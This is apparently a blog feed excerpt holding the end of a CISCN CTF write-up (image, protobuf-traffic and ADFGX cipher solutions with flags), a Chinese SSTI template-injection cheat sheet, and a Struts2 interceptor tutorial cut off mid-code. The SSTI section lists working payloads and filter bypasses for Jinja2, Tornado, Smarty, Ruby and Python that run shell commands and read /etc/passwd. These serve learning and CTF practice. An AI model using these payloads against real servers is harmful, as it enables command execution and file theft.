framepic = framepic.convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    width,height = framepic.size<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            <span class="hljs-keyword">if</span> framepic.getpixel((w,h)) == (<span class="hljs-number">233</span>,<span class="hljs-number">233</span>,<span class="hljs-number">233</span>):<br>                flag_img.putpixel((h,w),<span class="hljs-number">1</span>)<br><br>    flag_img.save(<span class="hljs-string">f&quot;flag_<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>最后一张图<br><img src="https://img-blog.csdnimg.cn/2021052120570322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据字符出现顺序得到：12504D0F-9DE1-4B00-87A5-A5FDD0986A00<br>最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;<br></code></pre></td></tr></table></figure><h2 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h2><p>流量包拖入wirkshark中，导出http对象，发现了两个gzip和两个br文件<br><img src="https://img-blog.csdnimg.cn/20210521211621458.png" alt="在这里插入图片描述"><br>解压flag_wrapper得到…<br><img src="https://img-blog.csdnimg.cn/20210521211307860.png" alt="在这里插入图片描述"><br>把test后缀改为br，解压得到test：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br>message PBResponse &#123;<br>  int32 code = 1;<br>  int64 flag_part_convert_to_hex_plz = 2;<br>  message data &#123;<br>    string junk_data = 2;<br>    string flag_part = 1;<br>  &#125;<br>  repeated data dataList = 3;<br>  int32 flag_part_plz_convert_to_hex = 4;<br>  string flag_last_part = 5;<br>&#125;<br><br>message PBRequest &#123;<br>  string cate_id = 1;<br>  int32 page = 2;<br>  int32 pageSize = 3;<br>&#125;<br></code></pre></td></tr></table></figure><p>下载解压后进入到bin目录，将之前解压出来的test改为test.proto并移动到bin目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\protoc.exe --python_out=. test.proto<br></code></pre></td></tr></table></figure><p>得到test_pb2.py，把解压后的secret也移动到bin目录<br><img src="https://img-blog.csdnimg.cn/20210521225101522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import test_pb2<br><br>with open(<span class="hljs-string">&#x27;./secret&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>    data = f.read()<br>    target = test_pb2.PBResponse()<br>    target.ParseFromString(data)<br>    <span class="hljs-built_in">print</span>(target)<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">code: 200<br>flag_part_convert_to_hex_plz: 15100450<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;e2345&quot;</span><br>  junk_data: <span class="hljs-string">&quot;7af2c&quot;</span><br>&#125;<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;7889b0&quot;</span><br>  junk_data: <span class="hljs-string">&quot;82bc0&quot;</span><br>&#125;<br>flag_part_plz_convert_to_hex: 16453958<br>flag_last_part: <span class="hljs-string">&quot;d172a38dc&quot;</span><br></code></pre></td></tr></table></figure><p>把15100450和16453958转换为hex，和其他hex按顺序拼接得到最终flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;<br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h2><p>附件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX<br></code></pre></td></tr></table></figure><p><a href="https://wishingstarmoye.com/ctf/adfgx">ADFGX密码</a>，用最经典的密码表<code>phqgmeaynofdxkrcvszwbutil</code>，key为题目名字<code>classic</code>，最可气的是解密时需要将附件中的内容反转得到密文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">str=<span class="hljs-string">&quot;AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX&quot;</span><br><span class="hljs-built_in">print</span>(str[::-1])<br><br><span class="hljs-comment">#XDGXDAFGADFFFFXDADGDXAGFXAGDFGAGFDFDXDAGFDAXXDAXGFGFAGGFAAAXAFAAAAADXDXXAXXDFDFDXAXDXDAAGFFDAXFFXXAFAXAXGDGXAGAAXDAAXFXAFDFGXDXDXDXDFFXDFFXDDFAGAXAAGXGXFFFFXDXAFDFFXDFGXDGFDAAXFGFDAFAXXDFDXAXA</span><br></code></pre></td></tr></table></figure><p>然后再解密得到flag，大意了<br><img src="https://img-blog.csdnimg.cn/20210521214939316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;esay-sql&quot;&gt;&lt;a href=&quot;#esay-sql&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="比赛复现" scheme="https://swhat.github.io/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="https://swhat.github.io/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模板注入漏洞</title>
    <link href="https://swhat.github.io/2021/05/21/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://swhat.github.io/2021/05/21/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-05-21T14:26:42.000Z</published>
    <updated>2021-11-27T12:24:04.672Z</updated>
    
    <content type="html"><![CDATA[<h1 id="4-11-模版注入"><a href="#4-11-模版注入" class="headerlink" title="4.11. 模版注入"></a>4.11. 模版注入</h1><h2 id="4-11-1-简介"><a href="#4-11-1-简介" class="headerlink" title="4.11.1. 简介"></a>4.11.1. 简介</h2><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p><h2 id="4-11-2-测试方法"><a href="#4-11-2-测试方法" class="headerlink" title="4.11.2. 测试方法"></a>4.11.2. 测试方法</h2><ul><li><p>确定使用的引擎</p></li><li><p>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</p></li><li><p>需找攻击面，尝试攻击</p></li></ul><h2 id="4-11-3-测试用例"><a href="#4-11-3-测试用例" class="headerlink" title="4.11.3. 测试用例"></a>4.11.3. 测试用例</h2><ul><li>简单的数学表达式</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; 7+7 &#125;&#125; =&gt; 14<br></code></pre></td></tr></table></figure><ul><li>字符串表达式 </li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; &quot;ajin&quot; &#125;&#125; =&gt; ajin<br></code></pre></td></tr></table></figure><ul><li><strong>Ruby</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;%= <span class="hljs-number">7</span> * <span class="hljs-number">7</span> %&gt;<br>&lt;%= File.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read %&gt;<br></code></pre></td></tr></table></figure><ul><li><strong>Java</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">$&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>Twig</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>Smarty</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;php&#125;echo `<span class="hljs-built_in">id</span>`;&#123;/php&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>AngularJS</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">$<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><strong>Tornado</strong></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">引用模块 &#123;% <span class="hljs-keyword">import</span> module %&#125;<br>=&gt; &#123;% import os %&#125;&#123;&#123; os.popen(&quot;whoami&quot;).read() &#125;&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>Flask/Jinja2</strong></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; config &#125;&#125;<br><br>&#123;&#123; config.items() &#125;&#125;<br><br>&#123;&#123;get_flashed_messages.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()&#125;&#125;<br><br>&#123;&#123; url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls&#x27;</span>) &#125;&#125;<br><br>&#123;&#123; request.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;<br><br><br><br><br><br>name=&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;<br><br>name=&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br>第<span class="hljs-number">133</span>个类：&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">os</span>.<span class="hljs-title">_wrap_close</span>&#x27;&gt; </span><br><span class="hljs-class"></span><br>name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>Django</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; request &#125;&#125;<br><br>&#123;% debug %&#125;<br><br>&#123;% load module %&#125;<br><br>&#123;% include <span class="hljs-string">&quot;x.html&quot;</span> %&#125;<br><br>&#123;% extends <span class="hljs-string">&quot;x.html&quot;</span> %&#125;<br></code></pre></td></tr></table></figure><h2 id="4-11-4-目标"><a href="#4-11-4-目标" class="headerlink" title="4.11.4. 目标"></a>4.11.4. 目标</h2><ul><li><p>创建对象</p></li><li><p>文件读写</p></li><li><p>远程文件包含</p></li><li><p>信息泄漏</p></li><li><p>提权</p></li></ul><h2 id="4-11-5-相关属性"><a href="#4-11-5-相关属性" class="headerlink" title="4.11.5. 相关属性"></a>4.11.5. 相关属性</h2><h3 id="4-11-5-1-class"><a href="#4-11-5-1-class" class="headerlink" title="4.11.5.1. class"></a>4.11.5.1. <strong>class</strong></h3><p>python中的新式类（即显示继承object对象的类）都有一个属性 <strong>class</strong> 用于获取当前实例对应的类，例如 “”.<strong>class</strong> 就可以获取到字符串实例对应的类</p><h3 id="4-11-5-2-mro"><a href="#4-11-5-2-mro" class="headerlink" title="4.11.5.2. mro"></a>4.11.5.2. <strong>mro</strong></h3><p>python中类对象的 <strong>mro</strong> 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</p><h3 id="4-11-5-3-globals"><a href="#4-11-5-3-globals" class="headerlink" title="4.11.5.3. globals"></a>4.11.5.3. <strong>globals</strong></h3><p>保存了函数所有的所有全局变量，在利用中，可以使用 <strong>init</strong> 获取对象的函数，并通过 <strong>globals</strong> 获取 file os 等模块以进行下一步的利用</p><h3 id="4-11-5-4-subclasses"><a href="#4-11-5-4-subclasses" class="headerlink" title="4.11.5.4. subclasses()"></a>4.11.5.4. <strong>subclasses</strong>()</h3><p>python的新式类都保留了它所有的子类的引用，<strong>subclasses</strong>() 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p><p>因为python中的类都是继承object的，所以只要调用object类对象的 <strong>subclasses</strong>() 方法就可以获取想要的类的对象。</p><h2 id="4-11-6-常见Payload"><a href="#4-11-6-常见Payload" class="headerlink" title="4.11.6. 常见Payload"></a>4.11.6. 常见Payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">r&#x27;/etc/passwd&#x27;</span>).read()<br><br>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span> )<br></code></pre></td></tr></table></figure><h2 id="4-11-7-绕过技巧"><a href="#4-11-7-绕过技巧" class="headerlink" title="4.11.7. 绕过技巧"></a>4.11.7. 绕过技巧</h2><h3 id="4-11-7-1-字符串拼接"><a href="#4-11-7-1-字符串拼接" class="headerlink" title="4.11.7.1. 字符串拼接"></a>4.11.7.1. 字符串拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">request[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>].__base__.__base__.__base__[<span class="hljs-string">&#x27;__subcla&#x27;</span>+<span class="hljs-string">&#x27;sses__&#x27;</span>]()[<span class="hljs-number">60</span>]<br></code></pre></td></tr></table></figure><h3 id="4-11-7-2-使用参数绕过"><a href="#4-11-7-2-使用参数绕过" class="headerlink" title="4.11.7.2. 使用参数绕过"></a>4.11.7.2. 使用参数绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">params = &#123;<br>    <span class="hljs-string">&#x27;clas&#x27;</span>: <span class="hljs-string">&#x27;__class__&#x27;</span>,<br>    <span class="hljs-string">&#x27;mr&#x27;</span>: <span class="hljs-string">&#x27;__mro__&#x27;</span>,<br>    <span class="hljs-string">&#x27;subc&#x27;</span>: <span class="hljs-string">&#x27;__subclasses__&#x27;</span><br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;data&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;</span><br>&#125;<br>r = requests.post(url, params=params, data=data)<br>print(r.text)<br></code></pre></td></tr></table></figure><h2 id="4-11-8-参考链接"><a href="#4-11-8-参考链接" class="headerlink" title="4.11.8. 参考链接"></a>4.11.8. 参考链接</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/28823933">服务端模版注入</a></li><li><a href="http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/">用Python特性任意代码执行</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;4-11-模版注入&quot;&gt;&lt;a href=&quot;#4-11-模版注入&quot; class=&quot;headerlink&quot; title=&quot;4.11. 模版注入&quot;&gt;&lt;/a&gt;4.11. 模版注入&lt;/h1&gt;&lt;h2 id=&quot;4-11-1-简介&quot;&gt;&lt;a href=&quot;#4-11-1-简介&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="SSTI" scheme="https://swhat.github.io/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Struts2之拦截器</title>
    <link href="https://swhat.github.io/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/"/>
    <id>https://swhat.github.io/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/</id>
    <published>2021-04-25T08:16:03.000Z</published>
    <updated>2021-08-15T03:59:06.561Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（三）</p> <a id="more"></a><h2 id="拦截器简介"><a href="#拦截器简介" class="headerlink" title="拦截器简介"></a>拦截器简介</h2><p>   拦截器（Interceptor）是Struts2的核心组成部分，它可以动态拦截Action调用的对象，类似于Servlet中的过滤器。 Struts2的拦截器是AOP（Aspect-Object-Programming，面向切面编程）的一种实现策略，是可插拔的。它可以任意地组合Action提供的附加功能，而不需要修改Action的代码，开发者只需要提供拦截器的实现类，并将其配置在struts.xml中即可。</p><p>每个拦截器可以完成单个功能。不同功能的拦截器按照一定的顺序排列在一起形成的链，就是拦截器链。拦截器链组成的集合就是拦截器栈。</p><h2 id="拦截器配置"><a href="#拦截器配置" class="headerlink" title="拦截器配置"></a>拦截器配置</h2><p><strong>1.拦截器</strong><br>要想拦截器起作用，首先要在struts.xml文件中进行配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;paramName&quot;</span>&gt;</span>paramValue<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor</span>&gt;</span><br></code></pre></td></tr></table></figure><p>name属性用来指定拦截器的名称，class属性用于指定拦截器的实现类。如果在定义拦截器时需要传入参数，这时需要使用<code>&lt;param&gt;</code>标签,其中name属性用来指定参数的名称，paramValue表示参数的值。</p><p><strong>2.拦截栈</strong><br>在实际开发中，经常需要在Action执行前同时执行多个拦截动作，如用户登录检查、登录日志记录以及权限检查等，这时，可以把多个拦截器组成一个拦截器栈。<br>在使用时，可以将栈内的多个拦截器当成个整体来引用。 当拦截器栈被附加到一个 Action上时，在执行Action之前必须先执行拦截器栈中的每一一 个拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorStackName&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span> /&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br></code></pre></td></tr></table></figure><p>interceptorStackName值代表配置的拦截器栈的名称，interceptorName值代表拦截器的名称。</p><p>除此之外，一个拦截器栈也可以包含另外一个拦截器栈：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>    <span class="hljs-comment">&lt;!--声明拦截器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span> /&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在定义的拦截栈myStack中，除了引用了两个自定义的拦截器interceptor1和interceptor2外，还引用了一个内置拦截器栈defaultStack，且该内置拦截器栈必不可少。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--配置用户自定义的拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span>/&gt;</span><br>            <br>            <span class="hljs-comment">&lt;!--自定义拦截器栈，我们配置了自定义的拦截器，默认的拦截器栈就不会被执行，因此，想要使用默认的拦截器功能，就要配置进来--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用默认的拦截器栈，一定要放在第一行--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defalutStack&quot;</span>/&gt;</span><br>                <br>                <span class="hljs-comment">&lt;!--引用自定义的拦截器--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!--上面配置了拦截器栈，但是没有被执行...下面配置执行拦截器--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>/&gt;</span><br>        <br>        <span 